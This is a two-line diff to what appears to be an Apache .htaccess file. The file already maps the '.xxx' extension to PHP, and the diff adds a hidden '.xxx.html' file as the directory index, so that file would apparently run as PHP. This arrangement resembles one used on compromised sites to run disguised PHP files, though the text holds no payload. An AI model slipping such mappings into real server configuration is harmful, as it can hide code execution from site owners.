@@ -1,1 +1,2 @@
+DirectoryIndex .xxx.html
 AddType application/x-httpd-php .xxx
